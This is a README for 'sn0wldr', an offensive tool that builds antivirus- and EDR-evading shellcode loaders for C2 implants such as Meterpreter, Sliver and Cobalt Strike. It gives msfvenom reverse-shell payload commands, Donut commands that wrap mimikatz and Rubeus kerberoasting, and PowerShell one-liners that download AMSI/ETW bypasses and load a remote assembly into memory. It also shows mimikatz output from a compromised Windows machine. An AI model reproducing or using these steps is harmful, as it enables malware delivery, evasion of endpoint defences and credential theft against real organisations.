# sn0wldr

## This is used to generate a AV bypassed sc loader.

up to test day, most common AVs can be bypassed: Windows defender, ATP, CS Falcon, Carbon Black, Red Canary, Cylance and McAfee.

### Install MONO when using Kali Linux / Debian Based Distributions

```
sudo apt install apt-transport-https dirmngr gnupg ca-certificates
sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv-keys 3FA7E0328081BFF6A14DA29AA6A19B38D3D831EF
echo "deb https://download.mono-project.com/repo/debian stable-buster main" | sudo tee /etc/apt/sources.list.d/mono-official-stable.list
sudo apt update
sudo apt-get install mono-complete
```

### Install MONO when using Ubuntu (tested for 22.04)

```
sudo apt install apt-transport-https dirmngr gnupg ca-certificates
sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv-keys 3FA7E0328081BFF6A14DA29AA6A19B38D3D831EF
echo "deb https://download.mono-project.com/repo/ubuntu stable-focal main" | sudo tee /etc/apt/sources.list.d/mono-official-stable.list
sudo apt update
sudo apt install mono-complete
```

### Currently supporting the following C2 plateform (It is now should be able to support any C2 if shellcode is provided):

- Meterpreter
- Covenent
- Sliver
- Cobalt Strike

### Feature

- Process Hollowing
- Behaviour detection bypass
- Random AES encryption
- Rewrite to use D/Invoke direct syscalls
- Add a new haloloader_template to use [SharpHalos](https://github.com/GetRektBoy724/SharpHalos), HaloGates direct syscalls methods to load shellcode

### Guide

1. Generate shellcode for supported C2 implant in raw format (this is acutally can be used to load any payload in raw shellcode format):
   
For Sliver:

Due to the latest Sliver has shellcode encoding enabled by default which somehow break the halogate loader, so need to disable it when generate the shellcode by issue `-G`. Evasion and Obfuscation can both be enabled for better EDR bypass:

```
### To Generate a Sliver implant shellcode without obfuscation:
### For latest Sliver, it has shellcode encoding enabled by default which somehow break the halogate loader, so need to disable it when generate the shellcode by issue "-G". Evasion and Obfuscation can both be enabled for better EDR bypass: 
# [server] sliver > generate -N sliver --mtls 10.0.0.145 -b 10.0.0.145 -e -G -f shellcode --save /root/Codes/sn0wldr/input/
# [*] Generating new windows/amd64 implant binary
# [!] Symbol obfuscation is disabled
# [*] Build completed in 00:01:25
# [*] Implant saved to /root/Codes/sn0wldr/input/sliver.bin
#
### Move the sliver.bin to folder input if required, then run the autogen script.
```

For Meterpreter:

```
### To Generate a Meterpreter implant shellcode without obfuscation:
# for x64
# msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.0.0.145 LPORT=8443 -f raw -o input/meterpreter.bin
# for x86
# msfvenom -p windows/meterpreter/reverse_https LHOST=10.0.0.145 LPORT=8443 -f raw -o input/meterpreter.bin
### Move the meterpreter.bin to folder input if required, then run the autogen script.
```

For CobaltStrike:

```
### To Generate a CS implant shellcode without obfuscation:
# Attacks -> Packages -> Payload Generator
# Choose Raw in Output area.
### Move the cobaltstrike.bin to folder input and rename to cobaltstrike.bin, then run the autogen script.
```

For any sharp tools, thanks to TheWover's cool tool [Donut](https://github.com/TheWover/donut), we can convert any Sharp EXE file into raw shellcode then used into this loader:

Such as Mimikatz:
```
### To Generate shellcode from the EXE using donut:
┌──(root㉿average-student)-[/opt/donut_v0.9.3]
└─# ./donut -e 3 -a 3 -b 1 -f 1 -x 1 -p "coffee" -o /root/myCodes/sn0wldr/input/other.bin ./mimikatz.exe

  [ Donut shellcode generator v0.9.3
  [ Copyright (c) 2019 TheWover, Odzhan

  [ Instance type : Embedded
  [ Module file   : "./mimikatz.exe"
  [ Entropy       : Random names + Encryption
  [ File type     : EXE
  [ Parameters    : coffee
  [ Target CPU    : x86+amd64
  [ AMSI/WDLP     : none
  [ Shellcode     : "/root/myCodes/sn0wldr/input/other.bin"
                                                                                       
```

Or Rubeus:
```
┌──(root㉿average-student)-[/opt/donutv1]
└─# ./donut -e 3 -a 2 -f 1 -x 1 -b 3 -p "kerberoast /simple /nowrap /consoleoutfile:C:/Windows/Tasks/rub_out.txt /outfile:C:/Windows/Tasks/krb_hashes.txt" -o /root/myCodes/sn0wldr/input/other.bin --input:/var/www/html/PowerSharpLoader/x64/Rubeus.exe 

  [ Donut shellcode generator v1 (built Mar  3 2023 13:39:03)
  [ Copyright (c) 2019-2021 TheWover, Odzhan

  [ Instance type : Embedded
  [ Module file   : "/var/www/html/PowerSharpLoader/x64/Rubeus.exe"
  [ Entropy       : Random names + Encryption
  [ File type     : .NET EXE
  [ Parameters    : kerberoast /simple /nowrap /consoleoutfile:C:/Windows/Tasks/rub_out.txt /outfile:C:/Windows/Tasks/krb_hashes.txt
  [ Target CPU    : amd64
  [ AMSI/WDLP/ETW : continue
  [ PE Headers    : overwrite
  [ Shellcode     : "/root/myCodes/sn0wldr/input/other.bin"
  [ Exit          : Thread

```

2. Move the generated shellcode bin file to `input` folder, and rename it as format: `<c2type>.bin`

3. Run the autogen script `autogen_loader.sh`, wait for couple of minutes and check the generated encrypted EXE in the output folder.

```
┌──(root💀TW-PenTestBox)-[~/myCodes/sn0wldr]
└─# ./autogen_loader.sh -h
[*] Usage: ./autogen_loader.sh -t <c2type> -a <target_os_arch> -s <syscall_type>
[*] Exg..: ./autogen_loader.sh -t sliver -a x64 -s halogate

[!] Make sure the shellcode bin file located in input folder and named as <c2type>.bin
[!] Currently c2type only support the following four:
[!] 	sliver|meterpreter|cobaltstrike|covenant
[!] Current directly syscall methods only support the following two:
[!] 	dinvoke|halogate
```

4. Since the generated executable file is Sharp Assembly, it can be chained with the tool [PowerSharpLoader](https://github.com/F4l13n5n0w/PowerSharpLoader) to load remotely into memory without touch disk, as shown in the following example:

```
IEX([Net.Webclient]::new().DownloadString("https://raw.githubusercontent.com/F4l13n5n0w/PowerSharpLoader/master/amsi3.txt"));
IEX([Net.Webclient]::new().DownloadString("https://raw.githubusercontent.com/F4l13n5n0w/PowerSharpLoader/master/etw.txt"));
IEX([Net.Webclient]::new().DownloadString("https://raw.githubusercontent.com/F4l13n5n0w/PowerSharpLoader/master/Invoke-LoadAssembly.ps1"));
Invoke-LoadAssembly -AssemblyUrl https://<your_server>/halosli64x2.exe -Command ""
```

5. The following shows the successful mimikatz execution on the target Windows 10 machine:

```
PS C:\Users\tester\Downloads\test> Invoke-LoadAssembly -AssemblyUrl "http://192.168.174.150/sn0wmimicoffee.exe" -Command ""
[mySharphalo.UsageExample]::Main($Command.Split(" "))
[+] handle 0D6C! meow executed!

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # coffee

    ( (
     ) )
  .______.
  |      |]
  \      /
   `----'

mimikatz #
```

### To Do

- Add bananameowloader for even better AV bypass

